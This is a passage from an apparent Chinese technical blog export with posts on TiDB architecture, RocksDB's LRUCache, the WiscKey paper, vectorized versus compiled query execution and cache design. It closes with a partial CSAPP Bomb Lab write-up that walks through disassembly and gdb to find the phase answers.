提出。传统意义上，数据库往往专为交易或者分析场景设计，因而数据平台往往需要被切分为 TP 和 AP 两个部分，而数据需要从交易库复制到分析型数据库以便快速响应分析查询。而新型的 HTAP 数据库则可以同时承担交易和分析两种智能，这大大简化了数据平台的建设，也能让用户使用更新鲜的数据进行分析。作为一款优秀的 HTAP 数据数据库，TiDB 除了优异的交易处理能力，也具备了良好的分析能力。 TiDB在整体架构基本是参考 Google Spanner 和 F1 的设计，上分两层为 TiDB 和 TiKV。 TiDB 对应的是 Google F1，是一层无状态的 SQL Layer，兼容绝大多数 MySQL 语法，对外暴露 MySQL 网络协议，负责解析用户的 SQL 语句，生成分布式的 Query Plan，翻译成底层 Key Value 操作发送给 TiKV，TiKV 是真正的存储数据的地方，对应的是 Google Spanner，是一个分布式 Key Value 数据库，支持弹性水平扩展，自动的灾难恢复和故障转移（高可用），以及 ACID 跨行事务。值得一提的是 TiKV 并不像 HBase 或者 BigTable 那样依赖底层的分布式文件系统，在性能和灵活性上能更好，这个对于在线业务来说是非常重要。 TiDB Server：SQL 层，对外暴露 MySQL 协议的连接 endpoint，负责接受客户端的连接，执行 SQL 解析和优化，最终生成分布式执行计划。TiDB 层本身是无状态的，实践中可以启动多个 TiDB 实例，通过负载均衡组件（如 LVS、HAProxy 或 F5）对外提供统一的接入地址，客户端的连接可以均匀地分摊在多个 TiDB 实例上以达到负载均衡的效果。TiDB Server 本身并不存储数据，只是解析 SQL，将实际的数据读取请求转发给底层的存储节点 TiKV（或 TiFlash）。 PD (Placement Driver) Server：整个 TiDB 集群的元信息管理模块，负责存储每个 TiKV 节点实时的数据分布情况和集群的整体拓扑结构，提供 TiDB Dashboard 管控界面，并为分布式事务分配事务 ID。PD 不仅存储元信息，同时还会根据 TiKV 节点实时上报的数据分布状态，下发数据调度命令给具体的 TiKV 节点，可以说是整个集群的“大脑”。此外，PD 本身也是由至少 3 个节点构成，拥有高可用的能力。建议部署奇数个 PD 节点。 存储节点 TiKV Server：负责存储数据，从外部看 TiKV 是一个分布式的提供事务的 Key-Value 存储引擎。存储数据的基本单位是 Region，每个 Region 负责存储一个 Key Range（从 StartKey 到 EndKey 的左闭右开区间）的数据，每个 TiKV 节点会负责多个 Region。TiKV 的 API 在 KV 键值对层面提供对分布式事务的原生支持，默认提供了 SI (Snapshot Isolation) 的隔离级别，这也是 TiDB 在 SQL 层面支持分布式事务的核心。TiDB 的 SQL 层做完 SQL 解析后，会将 SQL 的执行计划转换为对 TiKV API 的实际调用。所以，数据都存储在 TiKV 中。另外，TiKV 中的数据都会自动维护多副本（默认为三副本），天然支持高可用和自动故障转移。 TiFlash：TiFlash 是一类特殊的存储节点。和普通 TiKV 节点不一样的是，在 TiFlash 内部，数据是以列式的形式进行存储，主要的功能是为分析型的场景加速。 TiKV 基于 RocksDB，采用了 Raft 协议来实现分布式的一致性。TiKV 的系统架构如下图所示： 优点： 纯分布式架构，拥有良好的扩展性，支持弹性的扩缩容 支持 SQL，对外暴露 MySQL 的网络协议，并兼容大多数 MySQL 的语法，在大多数场景下可以直接替换 MySQL 默认支持高可用，在少数副本失效的情况下，数据库本身能够自动进行数据修复和故障转移，对业务透明 支持 ACID 事务，对于一些有强一致需求的场景友好，例如：银行转账 具有丰富的工具链生态，覆盖数据迁移、同步、备份等多种场景 智能的行列混合模式，TiDB 可经由优化器自主选择行列。这套选择的逻辑与选择索引类似：优化器根据统计信息估算读取数据的规模，并对比选择列存与行存访问开销，做出最优选择 缺点： 虽然兼容MySQL，但是不支持存储过程，触发器，自定义函数，窗口功能有限 不适用数据量小的场景，专门为大数据量设计","link":"/2021/02/16/TiDB-%E6%9E%B6%E6%9E%84/"},{"title":"从 Row Cache 的 Get 来看 Rocksdb LRUCache","text":"本文简单介绍 RocksDB 6.7.3 版本的 LRUCache。 Row CacheRow Cache 对查找的 key 在 SST 中对应的 value 进行 cache。如果 row_cache 打开，在 TableCache::Get 函数中，会调用 CreateRowCacheKeyPrefix 和 GetFromRowCache 获取 row cache 的 key（fd_number + seq_no + user_key），在 GetFromRowCache 中，会调用 row_cache-&gt;Lookup，得到 row cache 缓存的 row_handle，构造 found_row_cache_entry 指针指向 value，利用 Cleannable 类的特性，可以通过减少一次对 value 内存拷贝的方式来获取最终的结果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566Status TableCache::Get(const ReadOptions&amp; options, const InternalKeyComparator&amp; internal_comparator, const FileMetaData&amp; file_meta, const Slice&amp; k, GetContext* get_context, const SliceTransform* prefix_extractor, HistogramImpl* file_read_hist, bool skip_filters, int level) { ... if (ioptions_.row_cache &amp;&amp; !get_context-&gt;NeedToReadSequence()) { auto user_key = ExtractUserKey(k); CreateRowCacheKeyPrefix(options, fd, k, get_context, row_cache_key); done = GetFromRowCache(user_key, row_cache_key, row_cache_key.Size(), get_context); if (!done) { row_cache_entry = &amp;row_cache_entry_buffer; } } ...}void TableCache::CreateRowCacheKeyPrefix(const ReadOptions&amp; options, const FileDescriptor&amp; fd, const Slice&amp; internal_key, GetContext* get_context, IterKey&amp; row_cache_key) { uint64_t fd_number = fd.GetNumber(); uint64_t seq_no = 0; ... AppendVarint64(&amp;row_cache_key, fd_number); AppendVarint64(&amp;row_cache_key, seq_no);}bool TableCache::GetFromRowCache(const Slice&amp; user_key, IterKey&amp; row_cache_key, size_t prefix_size, GetContext* get_context) { bool found = false; row_cache_key.TrimAppend(prefix_size, user_key.data(), user_key.size()); if (auto row_handle = ioptions_.row_cache-&gt;Lookup(row_cache_key.GetUserKey())) { // Cleanable routine to release the cache entry Cleanable value_pinner; auto release_cache_entry_func = [](void* cache_to_clean, void* cache_handle) { ((Cache*)cache_to_clean)-&gt;Release((Cache::Handle*)cache_handle); }; auto found_row_cache_entry = static_cast&lt;const std::string*&gt;(ioptions_.row_cache-&gt;Value(row_handle)); // If it comes here value is located on the cache. // found_row_cache_entry points to the value on cache, // and value_pinner has cleanup procedure for the cached entry. // After replayGetContextLog() returns, get_context.pinnable_slice_ // will point to cache entry buffer (or a copy based on that) and // cleanup routine under value_pinner will be delegated to // get_context.pinnable_slice_. Cache entry is released when // get_context.pinnable_slice_ is reset. value_pinner.RegisterCleanup(release_cache_entry_func, ioptions_.row_cache.get(), row_handle); replayGetContextLog(*found_row_cache_entry, user_key, get_context, &amp;value_pinner); RecordTick(ioptions_.statistics, ROW_CACHE_HIT); found = true; } else { RecordTick(ioptions_.statistics, ROW_CACHE_MISS); } return found;} LRUCache 类 Cache定义了 Cache 的接口，包括 Insert, Lookup, Release 等操作。 ShardedCache支持对 Cache 进行分桶，分桶数量为 2^num_shard_bits，每个桶的容量相等。分桶的依据是取 key 的 hash 值的高 num_shard_bits 位。 LRUCache实现了 ShardedCache，维护了一个 LRUCacheShard 数组，一个 shard 就是一个桶。 CacheShard定义了一个桶的接口，包括 Insert, Lookup, Release 等操作，Cache 的相关调用经过分桶处理后，都会调用指定桶的对应操作。 LRUCacheShard实现了 CacheShard，维护了一个 LRU list 和 hash table，用来实现 LRU 策略，他们的成员类型都是 LRUHandle。 LRUHandle保存 key 和 value 的单元，并且包含前向和后续指针，可以组成双向循环链表作为 LRU list。 LRUHandleTablehash table 的实现，根据 key 再次做了分组处理，并且尽量保证每个桶中只有一个元素，元素类型为 LRUHandle。提供了Lookup, Insert, Remove操作。 Lookup在 GetFromRowCache 中，会调用 row_cache-&gt;Lookup，这里实际调用的是 ShardedCache::Lookup 1234Cache::Handle* ShardedCache::Lookup(const Slice&amp; key, Statistics* /*stats*/) { uint32_t hash = HashSlice(key); return GetShard(Shard(hash))-&gt;Lookup(key, hash);} 获取哈希值，根据 hash 值的高 num_shard_bits 位获取 shard，再调用 LRUCacheShard::Lookup 1234567891011121314Cache::Handle* LRUCacheShard::Lookup(const Slice&amp; key, uint32_t hash) { MutexLock l(&amp;mutex_); LRUHandle* e = table_.Lookup(key, hash); if (e != nullptr) { assert(e-&gt;InCache()); if (!e-&gt;HasRefs()) { // The entry is in LRU since it's in hash and has no external references LRU_Remove(e); } e-&gt;Ref(); e-&gt;SetHit(); } return reinterpret_cast&lt;Cache::Handle*&gt;(e);} LRUCacheShard::Lookup 中又会调用 LRUHandleTable::Lookup，在 FindPointer 中，hash 到特定位置后，如果当前位置的 hash 和当前 hash 不一样，或者 key 不一样，并且指针也不为空，则继续向下找，直到找到 1234567891011LRUHandle* LRUHandleTable::Lookup(const Slice&amp; key, uint32_t hash) { return *FindPointer(key, hash);}LRUHandle** LRUHandleTable::FindPointer(const Slice&amp; key, uint32_t hash) { LRUHandle** ptr = &amp;list_[hash &amp; (length_ - 1)]; while (*ptr != nullptr &amp;&amp; ((*ptr)-&gt;hash != hash || key != (*ptr)-&gt;key())) { ptr = &amp;(*ptr)-&gt;next_hash; } return ptr;} 总结LRUCache 就是把多个 LRUCacheShard 组合起来，每个 LRUCacheShard 维护了一个 LRUHandle list 和 hash table，LRUHandleTable 用拉链法实现哈希表。通过对缓存的 Lookup 调用链分析可以看到具体的实现非常简练。 参考 Rocksdb Source Code 6.7.3 RocksDB. LRUCache源码分析 RocksDB中的LRUCache","link":"/2021/01/18/Rocksdb-Cache/"},{"title":"WiscKey: Separating Keys from Values in SSD-conscious Storage","text":"背景读写放大LSM-Tree key-value 存储存在读写放大的问题，例如对于LevelDB来说： 写放大：假如每一层的大小是上一层的 10 倍，那么当把 i-1 层中的一个文件合并到 i 层中时，LevelDB 需要读取 i 层中的文件的数量多达 10 个，排序后再将他们写回到 i 层中去。所以这个时候的写放大是 10。对于一个很大的数据集，生成一个新的 SSTable 文件可能会导致 L0-L6 中相邻层之间发生合并操作，这个时候的写放大就是50（L1-L6中每一层是10）。 读放大：(1) 查找一个 key-value 对时，LevelDB 可能需要在多个层中去查找。在最坏的情况下，LevelDB 在 L0 中需要查找 8 个文件，在 L1-L6 每层中需要查找 1 个文件，累计就需要查找 14 个文件。(2) 在一个 SSTable 文件中查找一个 key-value 对时，LevelDB 需要读取该文件的多个元数据块。所以实际读取的数据量应该是：index block + bloom-filter blocks + data block。例如，当查找 1KB 的 key-value 对时，LevelDB 需要读取 16KB 的 index block，4KB的 bloom-filter block 和 4KB 的 data block，总共要读取 24 KB 的数据。在最差的情况下需要读取 14 个 SSTable 文件，所以这个时候的写放大就是 24*14=336。较小的 key-value 对会带来更高的读放大。 WiscKey 论文中针对 LevelDB 测试的读写放大数据： 存储硬件在 SSD 上，顺序和随机读写性能差异不大。对于写操作而言，由于随机写会对 SSD 的寿命造成影响，顺序写的特性应该保留，对于读操作来说，顺序读和随机读的性能测试如下图所示： 每次请求数据的 size 越大，SSD 的随机读与顺序读差距越小，并发数越大，SSD 的随机读与顺序读差距也越小。 WiscKeyWiscKey 包括四个关键思想： (1) KV 分离，只有 key 在 LSM-Tree 上。(2) 在 KV 分离后，value 采用顺序追加写，不保序。因此范围查询中，WiscKey 使用并行 SSD 设备的随机读特性查询 value。(3) 使用 crash-consistency 和 garbage-collection 有效管理 value log。(4) 通过删除 LSM-Tree 日志而不牺牲一致性来优化性能。 KV 分离 KV 分离的设计要点如下： key 存在 LSM-Tree 上。 value 存在单独的 value log 中。 插入/更新数据的时候，首先将 value 追加到value log，然后将 key 插入 LSM-Tree 中。 删除数据的时候，只是将 key 在 LSM-Tree 中删除，value log 的数据不需要改变，因为 WiscKey 会有垃圾回收机制处理对应的 value。 读取数据时，先读 LSM-Tree，然后读 value log。 KV 分离对应的 ChallengesParallel Range Query 范围查询时，WiscKey 从 LSM-Tree 中读取多个 key 的元数据信息 &lt;key, address&gt;。 将这些 &lt;key, address&gt; 放入队列。 预读线程（默认32个）会从队列中获取 value 的地址，然后并行读取 value 数据。 Garbage Collection Value log 结构如图所示，其由 value_entry 组成，每个value_entry 是一个四元组 (key size, value size, key, value)。另外，Value log 有两个指针 head 和 tail，tail 指向 Value log 的起点；head 指向文件的尾部，所有新的数据都将追加到 head 位置。 垃圾回收时，线程将从 tail 指向的位置开始，每次读取一个 chunk 的数据（比如几MB），对于 chunk 中的每一个 value_entry，在 LSM-Tree 中查找 key 以便判断该 value_entry 是否仍然有效。如果有效，则将该条目追加到 head 指针指向的位置，并且需要更新 LSM-Tree 的记录，因为 value 的地址已经变了；如果无效，则将其舍弃。 同时，为了避免出现数据不一致（如在垃圾回收过程中发生了 crash），需要保证在释放对应的存储空间之前追加写入的新的有效 value 和新的 tail 指针持久化到了设备上。具体的步骤如下： 垃圾回收在将 value 追加到 vLog 之后，在 vLog 上调用 fsync() 同步地将新的 value 地址和 tail 指针地址写入到 LSM-Tree 中。（tail 指针的存储形式为 &lt;‘‘tail’’, tail-vLog-offset&gt;） 最后回收 vLog 旧的数据空间 Crash Consistency 如果不能在 LSM-Tree 中查询到对应的 key，那么处理方式和传统的 LSM-Tree 一样，返回空或者 key 不存在，即便其 value 已经写入到了 vLog 文件中，也会对其进行垃圾回收。 如果 LSM-Tree 中存在要查询的 Key，则会进行校验。校验首先校验从 LSM-Tree 中查询到的 value 地址信息是否在有效的 vLog 文件范围内；其次校验该地址对应的 value 上存取的 key 和要查询的 key 是否一致。如果校验失败，则删除 LSM-Tree 中相应 key，并返回 key 不存在。 另外，还可以引入 magic number 或 checksum 来校验 key 和 value 是否匹配。 总结WiscKey 基于 LevelDB，设计了一个针对 SSD 进行优化的持久化 KV 存储方案，它的核心思想就是将 key 和 value 分离，key 存储在 LSM-Tree 中，value 存储在 value log 中，保留了 LSM-Tree 的优势，减少读写放大，发挥了 SSD 顺序写与并行随机读性能好的优势，但在小 value 场景以及大数据集范围查询下，WiscKey 的性能比 LevelDB 差。 参考 Lu L, Pillai T S, Arpaci-Dusseau A C, et al. WiscKey: separating keys from values in SSD-conscious storage[C] 14th USENIX Conference on File and Storage Technologies (FAST 16). 2016: 133-148. LevelDB 源码分析（一）：简介 WiscKey: Separating Keys from Values in SSD-conscious Storage","link":"/2021/05/06/WiscKey-Separating-Keys-from-Values-in-SSD-conscious-Storage/"},{"title":"Vectorization vs. Compilation in Query Execution","text":"当代 CPU 特性超标量流水线与乱序执行CPU指令的执行可以分为5个阶段：取指令、指令译码、执行指令、访存取数、结果写回。 流水线：一套控制单元可以同时执行多条指令，不需要等到上一条指令执行完就可以执行下一条指令。 超标量：一个 CPU 核有多套控制单元，因此可以有多条 pipeline 并发执行。CPU 还会维护一个乱序执行的指令窗口，窗口中的无数据依赖的指令就可以被取来并发执行。并发指令越多越好，因为这样指令之间没有依赖，并发流水线的执行会更加的流畅。 分支预测遇到 if/switch 这种判断跳转的指令时会产生分支预测，分支预测系统会决定流水线接下来是载入紧挨着判断指令的下一条指令，还是载入跳转到另一个地址的指令。如果 CPU 的预测是正确的，那么判断指令结果出来的那一刻，真正需要执行的指令已经执行到尾声了，这时候只需要继续执行即可；如果CPU的预测是错误的，那么会把执行到尾声的错误指令全部清空，恢复到从未执行过的状态，然后再执行正确的指令。 程序分支越少或者是分支预测成功率越高，对流水线的执行就越有利，因为如果预测失败了，是要丢弃当前 pipeline 的所有指令重新 flush，这个过程往往会消耗掉十几个 CPU 周期。 多级存储与数据预取当数据在寄存器，cache 或者内存中，CPU 取数据的速度并不是在一个个数量级上的。CPU 取指令/数据的时候并不是直接从内存中取的，通常 CPU 和内存中会有多级缓存，分别为 L1，L2，L3 cache，其中 L1 cache 又可以分为 L1-data cache，L1-instruction cache。先从 cache 中取数据，若不存在，才访问内存。访问内存的时候会同时把访问数据相邻的一些数据一起加载进 cache 中。 预取指的是若数据存在线性访问的模式，CPU会主动把后续的内存块预先加载进cache中。 SIMD单指令多数据流，对于数据密集型的程序来说，可能会需要对大量不同的数据进行相同的运算。SIMD 引入了一组大容量的寄存器，比如 128 位，256 位。可以将这多个数据按次序同时放到一个寄存器。同时，CPU 新增了处理这种大容量寄存器的指令，可以在一个指令周期内完成多个数据的运算。 早期解释执行模型大多数的 query 解释器模型都是使用基于迭代器的火山模型，如下图所示。每个算子看成一个 iterator，iterator 会提供一个 next 方法，每个 next 方法只会产生一个 tuple，可以理解为一行数据。查询执行的时候，查询树自顶向下调用 next 接口，数据则自底向上被拉取处理，层层计算返回结果。所以火山模型属于 pull 模型。 Volcano 模型简单灵活，且这种设计不用占用过多的内存。火山模型将更多的内存资源用于磁盘 IO 的缓存设计而没有优化 CPU 的执行效率，这在当时的硬件基础上是很自然的权衡。但是现在 CPU 的硬件环境与大数据场景下，性能表现却差强人意。主要有如下几点原因： 时间都花在了query plan上，而不是计算上next 函数实现为虚函数，调用虚函数的时候要去查虚函数表，编译器无法对虚函数进行 inline 优化。同时会带来分支预测的开销，导致一次错误的 CPU 分支预测，需要多花费十几个 CPU 周期的开销。 CPU cache利用率低next 方法一次只返回一个元组，元组通常采用行存储，如果仅需访问其中某个字段但是每次都将整行数据填入 CPU cache，将导致那些不会被访问的字段也放在了 Cache 中，使得 cache 利用率非常低。 编译执行编译执行指的是运行时期的代码生成生成技术。在执行过程中生成编译执行代码，避免过多的虚函数调用和解析执行，因为在执行之初我们是知道关系代数的 Schema 信息。在具备 Schema 信息的情况下，事先生成好的代码，可以有效减少很多执行分支预测开销。 上图右边的代码非常紧凑，有效消除了字段个数，字段大小，字段类型，对于数据量特别多的处理场景，可以大大减少CPU开销，提高性能。 编译执行以数据为中心，消灭了火山模型中的大量虚函数调用开销。甚至使大部分指令执行，可以直接从寄存器取数，极大提高了执行效率。 在 Java 中通过 JIT 来实现，在 C++ 中通过 LLVM 来实现 codegen，对于 OLAP 这种运行时间较长的 query 来说，通常编译的时间是可以忽略的。 向量化执行向量可以理解为按列组织的一组数据，连续存储的一列数据，在内存中可以表示为一个向量。 向量模型和火山模型的本质区别就在于，数据处理的基本单元不再是按行组织的 tuple，而是按列组织的多个向量，我们常说的一个 chunk 其实就是多个 vector 的集合，就是多个列的意思。 向量化执行好处是：由于每次 next 都是处理一批数据，那么大大减少了虚函数调用的次数，分支预测的成功概率会提升，减少了分支预测的开销，并且充分发挥 SIMD 指令并行计算的优势；还可以和列式存储有效结合在一起，减少数据额外转换的 overhead。 向量化和编译执行比较向量化执行的主要访存开销在于像 join 这种算子的物化开销，物化就是从寄存器把数据读到内存中。而编译执行，tuple 可以一直留在寄存器中，一个 operator 处理完后，给另外一个 operator 继续处理。除非遇到不得不物化的情况。 向量化执行模型的循环较短，并发度高，可以同时有更多的指令等待取数。编译执行循环内部会包含多个 operator 的运算，这些有依赖关系的指令占据了大部分的乱序执行窗口，并发度低。 参考 Sompolski, J. , M. Zukowski , and P. A. Boncz . “Vectorization vs. Compilation in Query Execution.” International Workshop on Data Management on New Hardware ACM, 2011. S. Wanderman-Milne and N. Li, “Runtime Code Generation in Cloudera Impala,” IEEE Data Eng. Bull., vol. 37, no. 1, pp. 31–37, 2014. 向量化与编译执行浅析","link":"/2021/03/28/Vectorization-vs-Compilation-in-Query-Execution/"},{"title":"缓存设计","text":"概述在设计与开发高性能的系统时，基本都离不开缓存的设计。没有缓存对系统的加速和阻挡大量的请求直接落到系统的底层，系统是很难撑住高并发的冲击。无论是在 CPU 的 L1,L2,L3 缓存，数据库的 sql 语句执行缓存，系统应用的本地缓存，缓存总是解决性能的一把利器。本文主要探讨缓存带来的问题以及缓存方案的设计。 缓存带来的问题缓存一致性引入缓存后，主要是解决读的性能问题，但是数据总是要更新的，会存在操作隔离性和更新原子性的问题，是先更新缓存还是先更新数据库呢？ 操作隔离性：一条数据的更新涉及到存储和缓存两套系统，如果多个线程同时操作一条数据，并且没有方案保证多个操作之间的有序执行，就可能会发生更新顺序错乱导致数据不一致的问题 更新原子性：引入缓存后，我们需要保证缓存和存储要么同时更新成功，要么同时更新失败，否则部分更新成功就会导致缓存和存储数据不一致的问题 先更新缓存再更新数据库：更新缓存后，后续的读操作都会先从缓存获取从而获取的是最新的数据，但是如果第二步更新数据库失败，那么数据需要回滚，导致先前获取的数据是脏数据来带不可逆的业务影响 先更新数据库后更新缓存：先更新数据库，但是缓存没有更新，再将数据从数据库同步到缓存这一过程中，所有的读操作读的都是旧数据，会带来一定问题，牺牲小概率的一致性 缓存击穿缓存击穿是指：业务操作访问缓存时，没有访问到数据，又去访问数据库，但是从数据库也没有查询到数据，也不写入缓存，从而导致这些操作每次都需要访问数据库，造成缓存击穿。 解决办法一般有两种： 将每次从数据库获取的数据，即使是空值也先写入缓存，但是过期时间设置得比较短，后续的访问都直接从缓存中获取空值返回即可 通过 Bloom filter 记录 key 是否存在，从而避免无效数据的查询 缓存雪崩缓存雪崩是指：由于大量的热数据设置了相同或接近的过期时间，导致缓存在某一时刻密集失效，大量请求全部转发到数据库，或者是某个冷数据瞬间涌入大量访问数据库。 主要解决方法： 所有数据的过期时间不要设置成一样，防止出现数据批量失效，导致缓存雪崩的情况 采用互斥锁的方式：这里需要使用到分布式锁，在缓存失效后，如果访问同一数据的操作需要访问数据并去更新缓存时，对这些操作都加锁，保证只有一个线程去访问数据并更新缓存，后续所有操作还是从缓存中获取数据，如果一定时间没有获取到就返回默认值或返回空值。这样可以防止数据库压力增大，但是用户体验会降低 后台更新：业务操作需要访问缓存没有获取到数据时，不访问数据库更新缓存，只返回默认值。通过后台线程去更新缓存，这里有两种更新方式： 启动定时任务定时扫描所有缓存，如果不存在就更新，该方法导致扫描 key 间隔时间过长，数据更新不实时，期间业务操作一直会返回默认值，用户体验比较差 业务线程发现缓存失效后通过消息队列去更新缓存，这里因为是分布式的所以可能有很多条消息，需要考虑消息的幂等性。这种方式依赖消息队列，但是缓存更新及时，用户体验比较好，缺点是系统复杂度增高了 缓存方案的设计读取读数据流程很简单，先去缓存读取数据，如果缓存 MISS，则需要从存储中读取数据，并将数据更新到缓存系统中，整个流程如下所示： 更新通常选择以下方案，保障数据可靠性，尽量减少数据不一致的出现，通过 TTL 超时机制在一定时间段后自动解决数据不一致现象： 更新数据库，保证数据可靠性 更新缓存，有以下 2 个策略： 惰性更新：删除缓存中对应的 item，等待下次读 MISS 再缓存（推荐） 积极更新：将最新的数据更新到缓存 淘汰缓存的作用是将热点数据缓存到内存实现加速，内存的成本要远高于磁盘，因此我们通常仅仅缓存热数据在内存，冷数据需要定期的从内存淘汰，数据的淘汰通常有两种方案： 主动淘汰。通过对 Key 设置 TTL 的方式来让 Key 定期淘汰，以保障冷数据不会长久的占有内存（推荐） 被动淘汰。当缓存已用内存超过 Maxmemory 限定时触发淘汰，在 Maxmemory 的场景下缓存的质量是不可控的，因为每次缓存一个 Key 都可能需要去淘汰一个 Key 参考 翻越缓存的三座大山","link":"/2021/02/21/%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1/"},{"title":"Bomb Lab","text":"本文记录 CSAPP 的 Bomb Lab 完成方案。 bomb 1在 phase_1 中， 调用 strings_not_equal 函数： 12345678910000000000000140f &lt;phase_1&gt;: 140f: 48 83 ec 08 sub $0x8,%rsp 1413: 48 8d 35 36 1d 00 00 lea 0x1d36(%rip),%rsi # 3150 &lt;_IO_stdin_used+0x150&gt; 141a: e8 f0 04 00 00 callq 190f &lt;strings_not_equal&gt; 141f: 85 c0 test %eax,%eax 1421: 75 05 jne 1428 &lt;phase_1+0x19&gt; 1423: 48 83 c4 08 add $0x8,%rsp 1427: c3 retq 1428: e8 ee 05 00 00 callq 1a1b &lt;explode_bomb&gt; 142d: eb f4 jmp 1423 &lt;phase_1+0x14&gt; 如果字符串不相等，函数返回 1，jne 指令发生跳转，进入 explode_bomb 函数；如果字符串相等的话，函数返回 0，jne 指令不发生跳转，直接退出。strings_not_equal 函数有两个参数，分别为%rdi和%rsi: 12345678000000000000190f &lt;strings_not_equal&gt;: 190f: 41 54 push %r12 1911: 55 push %rbp 1912: 53 push %rbx 1913: 48 89 fb mov %rdi,%rbx 1916: 48 89 f5 mov %rsi,%rbp 1919: e8 d4 ff ff ff callq 18f2 &lt;string_length&gt; ... 一个参数为字符串输入，另一个参数由 phase_1 传入。因此，用 gdb 在 strings_not_equal 处进行断点调试，便可得出答案： 12345678910111213(gdb) break strings_not_equalBreakpoint 1 at 0x190f(gdb) runStarting program: /mnt/c/ubuntu/bomb65/bomb Welcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!testBreakpoint 1, 0x000000000800190f in strings_not_equal ()(gdb) p (char*)$rdi$1 = 0x80056a0 &lt;input_strings&gt; &quot;test&quot;(gdb) p (char*)$rsi$2 = 0x8003150 &quot;I am just a renegade hockey mom.&quot; 第一关答案为 I am just a renegade hockey mom. 。 bomb 2直接看 phase_2： 1234567891011121314151617181920212223242526000000000000142f &lt;phase_2&gt;: ... 143e: 48 89 44 24 18 mov %rax,0x18(%rsp) 1443: 31 c0 xor %eax,%eax 1445: 48 89 e6 mov %rsp,%rsi 1448: e8 f4 05 00 00 callq 1a41 &lt;read_six_numbers&gt; 144d: 83 3c 24 00 cmpl $0x0,(%rsp) -&gt; arr[0] = 0 1451: 75 07 jne 145a &lt;phase_2+0x2b&gt; 1453: 83 7c 24 04 01 cmpl $0x1,0x4(%rsp) -&gt; arr[1] = 1 1458: 74 05 je 145f &lt;phase_2+0x30&gt; 145a: e8 bc 05 00 00 callq 1a1b &lt;explode_bomb&gt; 145f: 48 89 e3 mov %rsp,%rbx -&gt; %rbx = arr[0] 1462: 48 8d 6b 10 lea 0x10(%rbx),%rbp -&gt; %rbp = arr[4] 1466: eb 0e jmp 1476 &lt;phase_2+0x47&gt; 1468: e8 ae 05 00 00 callq 1a1b &lt;explode_bomb&gt; 146d: 48 83 c3 04 add $0x4,%rbx -&gt; %rbx = arr[1] 1471: 48 39 eb cmp %rbp,%rbx -&gt; if (%rbx == arr[4]) 1474: 74 0c je 1482 &lt;phase_2+0x53&gt; 1476: 8b 43 04 mov 0x4(%rbx),%eax -&gt; %eax = arr[1] 1479: 03 03 add (%rbx),%eax -&gt; %eax = arr[0] + arr[1] 147b: 39 43 08 cmp %eax,0x8(%rbx) -&gt; if (%eax == arr[2]) 147e: 74 ed je 146d &lt;phase_2+0x3e&gt; 1480: eb e6 jmp 1468 &lt;phase_2+0x39&gt; 1482: 48 8b 44 24 18 mov 0x18(%rsp),%rax 1487: 64 48 33 04 25 28 00 xor %fs:0x28,%rax ... 在 147b 处，若 arr[2] = arr[0] + arr[1]，则函数继续跳转到 146d 处执行，这时 %rbx 的保存的地址由 arr[0] 变为 arr[1]，接下来判断 arr[3], arr[4]……直到 %rbx == arr[4]，也就是判断完了 arr[5] 后停止。因此可以得出，这 6 个数由前两项分别为 0 和 1 的斐波拉契数列组成。第二关答案为 0 1 1 2 3 5 。 bomb 3在 phase_3 中： 1214c1: e8 5a fc ff ff callq 1120 &lt;__isoc99_sscanf@plt&gt;14c6: 83 f8 01 cmp $0x1,%eax 在 14c6 处打断点，输入多个数后，打印 %eax 中的值： 12(gdb) i r eaxeax 0x2 2 可以判断，在 phase_3 中，我们需要输入两个数。再观察以下代码： 1214cb: 83 3c 24 07 cmpl $0x7,(%rsp)14cf: 77 4b ja 151c &lt;phase_3+0x7e&gt; 我们输入的第一个数不能大于 7。再向下看： 1234567891011121314151617181920212214db: 48 63 04 82 movslq (%rdx,%rax,4),%rax14df: 48 01 d0 add %rdx,%rax14e2: ff e0 jmpq *%rax14e4: e8 32 05 00 00 callq 1a1b &lt;explode_bomb&gt;14e9: eb e0 jmp 14cb &lt;phase_3+0x2d&gt;14eb: b8 ab 00 00 00 mov $0xab,%eax14f0: eb 3b jmp 152d &lt;phase_3+0x8f&gt;14f2: b8 ea 01 00 00 mov $0x1ea,%eax14f7: eb 34 jmp 152d &lt;phase_3+0x8f&gt;......152d: 39 44 24 04 cmp %eax,0x4(%rsp)1531: 75 15 jne 1548 &lt;phase_3+0xaa&gt;1533: 48 8b 44 24 08 mov 0x8(%rsp),%rax1538: 64 48 33 04 25 28 00 xor %fs:0x28,%rax153f: 00 00 1541: 75 0c jne 154f &lt;phase_3+0xb1&gt;1543: 48 83 c4 18 add $0x18,%rsp1547: c3 retq 1548: e8 ce 04 00 00 callq 1a1b &lt;explode_bomb&gt;154d: eb e4 jmp 1533 &lt;phase_3+0x95&gt;154f: e8 2c fb ff ff callq 1080 &lt;__stack_chk_fail@plt&gt; 可以看到这是 switch 的特征，根据 %rax 中的地址进行跳转，跳转后将数存入 %eax 中， 再跳入 152d 处将数与输入的第二个参数进行比较，如果不相等则触发炸弹爆炸。在这里我输入的第一个参数为 1，用 gdb 调试，查看 %rax 存储的地址： 12(gdb) i r raxrax 0x80014eb 134223083 这里将跳转至 14eb 处，即输入的第二个参数应该是 0xab，才不会发生爆炸。因此，第三关答案为 1 171 (答案不唯一)。 bomb 4和 phase_3 一样，接收两个参数： 1215b9: 83 f8 02 cmp $0x2,%eax15bc: 75 06 jne 15c4 &lt;phase_4+0x33&gt; 并且第一个参数不能大于 15： 1215be: 83 3c 24 0e cmpl $0xe,(%rsp)15c2: 76 05 jbe 15c9 &lt;phase_4+0x38&gt; func4 的返回值必须要等于 3，并且第二个参数也要等于 3，负责触发炸弹爆炸： 123456789101115c9: ba 0e 00 00 00 mov $0xe,%edx15ce: be 00 00 00 00 mov $0x0,%esi15d3: 8b 3c 24 mov (%rsp),%edi15d6: e8 79 ff ff ff callq 1554 &lt;func4&gt;15db: 83 f8 03 cmp $0x3,%eax15de: 75 07 jne 15e7 &lt;phase_4+0x56&gt;15e0: 83 7c 24 04 03 cmpl $0x3,0x4(%rsp)15e5: 74 05 je 15ec &lt;phase_4+0x5b&gt;15e7: e8 2f 04 00 00 callq 1a1b &lt;explode_bomb&gt;15ec: 48 8b 44 24 08 mov 0x8(%rsp),%rax15f1: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 再看看 func4： 12345678910111213141516171819202122230000000000001554 &lt;func4&gt;: 1554: 48 83 ec 08 sub $0x8,%rsp 1558: 89 d0 mov %edx,%eax 155a: 29 f0 sub 